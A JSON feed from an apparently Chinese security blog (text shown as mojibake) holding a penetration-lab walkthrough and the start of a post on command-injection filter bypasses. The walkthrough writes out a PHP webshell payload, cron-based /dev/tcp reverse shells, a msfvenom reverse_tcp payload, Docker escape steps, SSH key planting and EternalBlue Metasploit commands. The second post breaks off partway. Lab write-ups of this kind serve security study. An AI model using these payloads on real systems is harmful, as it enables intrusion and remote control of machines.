{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog",
    "description": "M1Nçš„åšå®¢",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "url": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "title": "çº¢æ—¥é¶åœº(å››)ç¬”è®°",
            "date_published": "2021-09-20T15:49:36.000Z",
            "content_html": "<h1 id=\"çº¢æ—¥é¶åœº-å››-ç¬”è®°\"><a href=\"#çº¢æ—¥é¶åœº-å››-ç¬”è®°\" class=\"headerlink\" title=\"çº¢æ—¥é¶åœº(å››)ç¬”è®°\"></a>çº¢æ—¥é¶åœº(å››)ç¬”è®°</h1><h2 id=\"å¤–ç½‘æ‰“ç‚¹\"><a href=\"#å¤–ç½‘æ‰“ç‚¹\" class=\"headerlink\" title=\"å¤–ç½‘æ‰“ç‚¹\"></a>å¤–ç½‘æ‰“ç‚¹</h2><h3 id=\"2001ç«¯å£Struct2\"><a href=\"#2001ç«¯å£Struct2\" class=\"headerlink\" title=\"2001ç«¯å£Struct2\"></a>2001ç«¯å£Struct2</h3><p>BurpæŠ“åŒ…çœ‹åˆ°Struct2å­—æ ·ï¼Œç›´æ¥å·¥å…·æµ‹è¯•ä¸€æŠŠæ¢­</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png\"></p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png\"></p>\n<h3 id=\"2002ç«¯å£Tomcat\"><a href=\"#2002ç«¯å£Tomcat\" class=\"headerlink\" title=\"2002ç«¯å£Tomcat\"></a>2002ç«¯å£Tomcat</h3><p>å¯ä»¥å‚è€ƒ<a href=\"https://www.freebuf.com/articles/web/271892.html\">https://www.freebuf.com/articles/web/271892.html</a></p>\n<p>ä½¿ç”¨PUTä¸Šä¼ å†°èé©¬ï¼Œæ³¨æ„ç›´æ¥ä¸Šä¼ <code>/shell.jsp</code>ä¸è¡Œå“¦</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png\"></p>\n<h3 id=\"2003ç«¯å£phpMyAdmin-4-8-1\"><a href=\"#2003ç«¯å£phpMyAdmin-4-8-1\" class=\"headerlink\" title=\"2003ç«¯å£phpMyAdmin 4.8.1\"></a>2003ç«¯å£phpMyAdmin 4.8.1</h3><p>å¯ä»¥å‚è€ƒ<a href=\"https://www.dazhuanlan.com/oliiiflorrr/topics/1144804\">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>\n<ol>\n<li>éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png\"></p>\n<ol start=\"2\">\n<li>ä½¿ç”¨SELECTè¯­å¥ååŒ…å«sessionæ–‡ä»¶æ¥get shellï¼Œå†™shell<code>SELECT &quot;&lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&lt;?=@eval($_POST[1]);&#39;);?&gt;&quot;  </code>ï¼Œè®¿é—®å‘ç°<code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>å‡ºç°phpinfoï¼Œç”¨èšå‰‘è¿æ¥m1n.phpå³å¯ã€‚</li>\n</ol>\n<h2 id=\"Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰\"><a href=\"#Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰\" class=\"headerlink\" title=\"Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰\"></a>Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰</h2><h3 id=\"å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ\"><a href=\"#å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ\" class=\"headerlink\" title=\"å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ\"></a>å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ</h3><ul>\n<li>æ£€æŸ¥ <code>/.dockerenv</code> æ–‡ä»¶æ˜¯å¦å­˜åœ¨</li>\n<li>æ£€æŸ¥ <code>/proc/1/cgroup</code> å†…æ˜¯å¦åŒ…å« Docker ç­‰å­—ç¬¦ä¸²</li>\n</ul>\n<h3 id=\"å°è¯•DirtyCowæ¼æ´é€ƒé€¸\"><a href=\"#å°è¯•DirtyCowæ¼æ´é€ƒé€¸\" class=\"headerlink\" title=\"å°è¯•DirtyCowæ¼æ´é€ƒé€¸\"></a>å°è¯•DirtyCowæ¼æ´é€ƒé€¸</h3><ol>\n<li>ä¸‹è½½POCï¼š<a href=\"https://github.com/scumjr/dirtycow-vdso\">https://github.com/scumjr/dirtycow-vdso</a></li>\n<li>ç¼–è¯‘ï¼Œä¸Šä¼ ï¼Œç›‘å¬ï¼Œè¿è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class=\"hljs-number\">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰\"><a href=\"#å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰\" class=\"headerlink\" title=\"å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰\"></a>å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰</h3><ol>\n<li>ä¸‹è½½POCï¼š<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>\n<li>æ”¹POCï¼ŒæŠŠpayloadé‚£è¡Œæ”¹æˆè‡ªå·±VPSçš„IP</li>\n<li>ç¼–è¯‘ï¼ˆå»ºè®®Linuxç¯å¢ƒä¸‹ï¼‰<code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>\n<li>ä¸Šä¼ æ–‡ä»¶ï¼Œç›‘å¬ç«¯å£ï¼Œæ‰§è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚</li>\n</ol>\n<h3 id=\"å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸\"><a href=\"#å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸\" class=\"headerlink\" title=\"å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸\"></a>å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸</h3><ol>\n<li><code>fdisk -l</code>æŸ¥çœ‹ç£ç›˜</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png\"></p>\n<ol start=\"2\">\n<li><p>åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒæŠŠ/dev/sda1æŒ‚åœ¨åˆ°è¯¥æ–‡ä»¶å¤¹</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> /m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">mount</span> /dev/sda<span class=\"hljs-number\">1</span> /m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure></li>\n<li><p>å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶éƒ½åˆ°äº†/m1nç›®å½•ä¸‹</p>\n</li>\n</ol>\n<p><img src=\"C:\\Users\\M1N\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210816152534150.png\" alt=\"image-20210816152534150\"></p>\n<h4 id=\"å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell\"><a href=\"#å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell\" class=\"headerlink\" title=\"å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell\"></a>å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell</h4><p>å‚è€ƒï¼š<a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>\n<ol>\n<li>å†™æ–‡ä»¶åˆ°<code>/var/spool/cron/crontabs/root</code>ï¼Œæ³¨æ„å†™åˆ°<code>/var/spool/cron/root</code>ä¸è¡Œå—·</li>\n<li>åŒæ—¶æ³¨æ„rootæ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º600</li>\n<li>æ³¨æ„å®šæ—¶ä»»åŠ¡æ–‡ä»¶å†…å®¹ä¸­ï¼Œè·¯å¾„è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œå»ºè®®æŠŠå‘½ä»¤å†™æˆ<code>.sh</code>æ–‡ä»¶ï¼Œç„¶å<code>chmod +x</code>ï¼Œç„¶åè°ƒç”¨ï¼Œä¸å®¹æ˜“å‡ºé”™</li>\n<li>ä¹Ÿå¯ä»¥<code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>\n<li>åœ¨æœ¬åœ°çš„Ubuntu20è™šæ‹Ÿæœºä¸­æˆåŠŸåå¼¹shellï¼Œä½†æ˜¯é¶åœºç¯å¢ƒä¸‹æ²¡æ³•æˆåŠŸï¼Œå†™å…¥äº†å®šæ—¶ä»»åŠ¡å¿…é¡»restartæ‰å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™ä¸æ‰§è¡Œï¼Œæ— å¥ˆã€‚</li>\n</ol>\n<p><strong>å®šæ—¶ä»»åŠ¡ç›¸å…³ç¬”è®°ï¼š</strong></p>\n<ol>\n<li><p>å®šæ—¶ä»»åŠ¡æœ‰æ—¶æ— æ³•çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥è¿™æ ·è·å–æŠ¥é”™ä¿¡æ¯</p>\n<p><code>\\* * * * * &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1&#39;&gt;/tmp/error.txt 2&gt;&amp;1</code></p>\n</li>\n<li><p>å®šæ—¶ä»»åŠ¡æŸ¥çœ‹æ—¥å¿—ï¼š<a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p>ï¼ˆ1ï¼‰æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ç›´æ¥ï¼š<code>tail -f /var/log/syslog</code></p>\n<p>ï¼ˆ2ï¼‰æŸ¥çœ‹crontabæ—¥å¿—ï¼š</p>\n<p>â€‹    æ–¹æ³•1</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. ä¿®æ”¹rsyslogæ–‡ä»¶ï¼Œå°†<span class=\"hljs-regexp\">/etc/</span>rsyslog.d/<span class=\"hljs-number\">50</span>-default.conf æ–‡ä»¶ä¸­çš„<span class=\"hljs-comment\">#cron.*å‰çš„#åˆ æ‰ï¼›</span><br><span class=\"hljs-number\">2</span>. é‡å¯rsyslogæœåŠ¡service rsyslog restart<br><span class=\"hljs-number\">3</span>. é‡å¯cronæœåŠ¡service cron restart<br></code></pre></td></tr></table></figure>\n\n<p>â€‹    æ–¹æ³•2</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. ç¼–è¾‘ <span class=\"hljs-regexp\">/etc/</span>syslog.confï¼Œå¹¶ä¸”æ‰“å¼€ä»¥cron.*å¼€å§‹çš„é‚£è¡Œæ³¨é‡Šã€‚<br><span class=\"hljs-number\">2</span>. è¿è¡Œ <span class=\"hljs-regexp\">/etc/i</span>nit.d/sysklogd restart<br><span class=\"hljs-number\">3</span>. è¿è¡Œ <span class=\"hljs-regexp\">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>\n\n<p>â€‹    æŸ¥çœ‹cronæ—¥å¿—</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. linux<br>çœ‹ <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/cronè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ï¼Œå¯ä»¥ç”¨tail -f /</span>var<span class=\"hljs-regexp\">/log/</span>cronè§‚å¯Ÿï¼ˆæˆ–è€…<span class=\"hljs-regexp\">/var/</span>log/cron.logï¼‰<br><br><span class=\"hljs-number\">2</span>. unix<br>åœ¨ <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>tmpæ–‡ä»¶ä¸­ï¼Œæœ‰croutXXX001864çš„tmpæ–‡ä»¶ï¼Œtail è¿™äº›æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡äº†ã€‚<br><br><span class=\"hljs-number\">3</span>. mailä»»åŠ¡<br>åœ¨ <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root æ–‡ä»¶ä¸­ï¼Œæœ‰crontabæ‰§è¡Œæ—¥å¿—çš„è®°å½•ï¼Œç”¨tail -f <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root å³å¯æŸ¥çœ‹æœ€è¿‘çš„crontabæ‰§è¡Œæƒ…å†µ<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"å°è¯•å†™-sshå…¬é’¥æ¥è¿æ¥\"><a href=\"#å°è¯•å†™-sshå…¬é’¥æ¥è¿æ¥\" class=\"headerlink\" title=\"å°è¯•å†™.sshå…¬é’¥æ¥è¿æ¥\"></a>å°è¯•å†™.sshå…¬é’¥æ¥è¿æ¥</h4><ol>\n<li><p>æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ssh</span>-keygen -f m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">chmod</span> <span class=\"hljs-number\">600</span> m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure></li>\n<li><p>æŠŠm1n.pubæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„<code>/root/.ssh/</code>ç›®å½•ä¸‹ï¼ˆæ³¨æ„ï¼Œæ˜¯/m1nä¸‹çš„/root/.sshï¼‰ï¼Œæ²¡æœ‰è¿™ä¸ªç›®å½•å°±åˆ›å»ºè¿™ä¸ªç›®å½•</p>\n</li>\n<li><p>æŠŠm1n.pubçš„æ–‡ä»¶å†…å®¹å†™åˆ°authorized_keysæ–‡ä»¶ä¸­<code>cat m1n.pub &gt; authorized_keys</code></p>\n</li>\n<li><p>ç„¶å<code>ssh -i m1n root@ip</code>è¿æ¥ï¼Œå³å¯</p>\n</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png\"></p>\n<ol start=\"5\">\n<li>è¸©å‘ç¬”è®°ï¼šä¸è¦å†™å…¬é’¥åˆ°<code>/home/ubuntu/.ssh/</code>ç›®å½•ä¸‹ï¼Œè¿ä¸ä¸Šã€‚</li>\n</ol>\n<h2 id=\"å†…ç½‘æ¸—é€\"><a href=\"#å†…ç½‘æ¸—é€\" class=\"headerlink\" title=\"å†…ç½‘æ¸—é€\"></a>å†…ç½‘æ¸—é€</h2><h3 id=\"ä¼ ğŸ\"><a href=\"#ä¼ ğŸ\" class=\"headerlink\" title=\"ä¼ ğŸ\"></a>ä¼ ğŸ</h3><h4 id=\"MSFğŸ\"><a href=\"#MSFğŸ\" class=\"headerlink\" title=\"MSFğŸ\"></a>MSFğŸ</h4><ol>\n<li><p>ç”ŸæˆmsfğŸ</p>\n<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>\n</li>\n<li><p>æŠŠğŸå„¿ä¼ åˆ°ç›®æ ‡æœºå­ä¸Šé¢</p>\n</li>\n<li><p>æ”»å‡»æœºæ‰§è¡Œä»¥ä¸‹</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">use exploit/multi/handler<br><span class=\"hljs-builtin-name\">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class=\"hljs-builtin-name\">set</span> lhost 10.192.168.145<br><span class=\"hljs-builtin-name\">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure></li>\n<li><p>ç›®æ ‡æœºå™¨æ·»åŠ æƒé™åæ‰§è¡Œmshell.elf</p>\n</li>\n<li><p>kaliæ¥æ”¶åˆ°shell</p>\n</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png\"></p>\n<ol start=\"5\">\n<li><p>msfæ‹¿åˆ°shellåï¼Œéœ€è¦å¯¼å…¥è·¯ç”±ï¼Œä½¿ç”¨msf6çš„è‡ªåŠ¨è·¯ç”±å¯¼å…¥</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">background<br><br><span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">post</span>/multi/manage/autoroute<br><br><span class=\"hljs-keyword\">set</span> session x<br><br><span class=\"hljs-keyword\">run</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png\"></p>\n</li>\n</ol>\n<h3 id=\"ä»£ç†è½¬å‘\"><a href=\"#ä»£ç†è½¬å‘\" class=\"headerlink\" title=\"ä»£ç†è½¬å‘\"></a>ä»£ç†è½¬å‘</h3><h4 id=\"ä½¿ç”¨ewä»£ç†è½¬å‘\"><a href=\"#ä½¿ç”¨ewä»£ç†è½¬å‘\" class=\"headerlink\" title=\"ä½¿ç”¨ewä»£ç†è½¬å‘\"></a>ä½¿ç”¨ewä»£ç†è½¬å‘</h4><ol>\n<li>ä¸Šä¼ ew_for_linux64</li>\n<li>æ‰§è¡Œ<code>./ew -s ssocksd -l 8888</code></li>\n<li>æ›´æ”¹kaliçš„/etc/proxychains4.confæ–‡ä»¶ï¼Œæ·»åŠ socks5 ip prot</li>\n<li>åœ¨éœ€è¦ä»£ç†æ—¶ï¼Œæ‰§è¡Œå‘½ä»¤å¦‚<code>proxychains4 curl http://127.0.0.1:2003/</code>å³å¯</li>\n</ol>\n<h3 id=\"Ubuntuä¿¡æ¯æ”¶é›†\"><a href=\"#Ubuntuä¿¡æ¯æ”¶é›†\" class=\"headerlink\" title=\"Ubuntuä¿¡æ¯æ”¶é›†\"></a>Ubuntuä¿¡æ¯æ”¶é›†</h3><ol>\n<li><p>ä»è·¯ç”±è¡¨å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªç½‘æ®µï¼Œæœ‰ä¸ª183ç½‘æ®µåº”è¯¥å°±æ˜¯å†…ç½‘ç½‘æ®µäº†</p>\n</li>\n<li><p>msfè¿›è¡Œä¸€æ³¢å­˜æ´»æ‰«æ</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/discovery/udp_probeset rhosts <span class=\"hljs-number\">192.168.183.0</span>-<span class=\"hljs-number\">255</span>set threads <span class=\"hljs-number\">5</span>run<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png\"></p>\n<p>å¯ä»¥çœ‹åˆ°æœ‰128ã€130ä¸¤å°æœºå­ã€‚</p>\n</li>\n<li><p>æ‰«ä¸€ä¸‹ms17-010</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/smb/smb_ms<span class=\"hljs-number\">17</span>_<span class=\"hljs-number\">010</span>set rhosts <span class=\"hljs-number\">192.168.183.128</span>-<span class=\"hljs-number\">130</span>run<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png\"></p>\n<p>å¯ä»¥çœ‹åˆ°128çš„win7å’Œ130çš„winserver2008éƒ½å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“ã€‚</p>\n</li>\n<li><p>å°è¯•æ‰“æ°¸æ’ä¹‹è“ï¼Œæµ‹è¯•å‘ç°128çš„win7èƒ½æ‰“é€šï¼Œ130çš„winserver2008æ‰“ä¸é€šã€‚</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">setg Proxies socks5:<span class=\"hljs-number\">10.0</span>.<span class=\"hljs-number\">5.100</span>:<span class=\"hljs-number\">8888</span>\t\t\t\t\t<span class=\"hljs-regexp\">//</span>MSFèµ°ewçš„ä»£ç†set ReverseAllowProxy true\t\t\t\t\t\t\t<span class=\"hljs-regexp\">//</span>å¼€å¯åå‘ä»£ç†use exploit<span class=\"hljs-regexp\">/windows/</span>smb<span class=\"hljs-regexp\">/ms17_010_eternalblueset payload windows/</span>x64<span class=\"hljs-regexp\">/meterpreter/</span>bind_tcpset rhost <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.128</span>set lport <span class=\"hljs-number\">4444</span>set AutoRunScript post<span class=\"hljs-regexp\">/windows/m</span>anage<span class=\"hljs-regexp\">/migrate       /</span><span class=\"hljs-regexp\">/è‡ªåŠ¨è¿ç§»è¿›ç¨‹run</span><br></code></pre></td></tr></table></figure>\n\n<p>æˆåŠŸæ‹¿ä¸‹shell</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png\"></p>\n</li>\n</ol>\n<h3 id=\"Win7æƒé™ç»´æŒ\"><a href=\"#Win7æƒé™ç»´æŒ\" class=\"headerlink\" title=\"Win7æƒé™ç»´æŒ\"></a>Win7æƒé™ç»´æŒ</h3><ol>\n<li>è™½ç„¶æ‹¿åˆ°äº†shellï¼Œä½†æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°è¿™ä¸ªshellç»å¸¸æ‰çº¿ï¼Œåªèƒ½æƒ³åŠæ³•å¼„ä¸ªç¨³å®šç‚¹çš„shell</li>\n<li></li>\n</ol>\n<h3 id=\"Win7ä¿¡æ¯æ”¶é›†\"><a href=\"#Win7ä¿¡æ¯æ”¶é›†\" class=\"headerlink\" title=\"Win7ä¿¡æ¯æ”¶é›†\"></a>Win7ä¿¡æ¯æ”¶é›†</h3><ol>\n<li><code>route print</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png\"></p>\n<ol start=\"2\">\n<li><code>net user /domain</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png\"></p>\n<ol start=\"3\">\n<li><code>net user</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png\"></p>\n<ol start=\"4\">\n<li><code>net view</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png\"></p>\n<ol start=\"5\">\n<li><code>ping WIN-ENS2VR5TR3N</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png\"></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "å­˜åœ¨é™åˆ¶çš„shellå‘½ä»¤æ‰§è¡Œ",
            "date_published": "2020-07-09T09:01:12.000Z",
            "content_html": "<h1 id=\"æˆªæ–­ç¬¦-amp-amp\"><a href=\"#æˆªæ–­ç¬¦-amp-amp\" class=\"headerlink\" title=\"æˆªæ–­ç¬¦;,|,||,&amp;&amp;\"></a>æˆªæ–­ç¬¦<code>;</code>,<code>|</code>,<code>||</code>,<code>&amp;&amp;</code></h1><ol>\n<li><code>|</code>è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°(è¾“å…¥)</li>\n<li><code>||</code> è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</li>\n<li><code>&amp;&amp;</code>è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤</li>\n<li><code>&amp;</code>è¡¨ç¤ºä»»åŠ¡åœ¨åå°æ‰§è¡Œ,å¦‚<code>java -jar test.jar &gt; log.txt &amp;</code>ï¼ŒåŒæ—¶ï¼Œæ”¾åœ¨ä¸¤ä¸ªå‘½ä»¤ä¹‹é—´æ—¶ä¸¤ä¸ªéƒ½ä¼šæ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤åå°æ‰§è¡Œ</li>\n<li><code>%0a</code>æ¢è¡Œç¬¦</li>\n<li><code>%0d</code>å›è½¦ç¬¦</li>\n<li><code>;</code></li>\n</ol>\n<h1 id=\"shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤\"><a href=\"#shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤\" class=\"headerlink\" title=\"shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤\"></a>shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤</h1><ol>\n<li><p>è¿‡æ»¤äº†ç©ºæ ¼</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-variable\">$IFS</span><br><span class=\"hljs-variable\">$&#123;IFS&#125;</span><br><span class=\"hljs-variable\">$IFS</span><span class=\"hljs-variable\">$1</span> <span 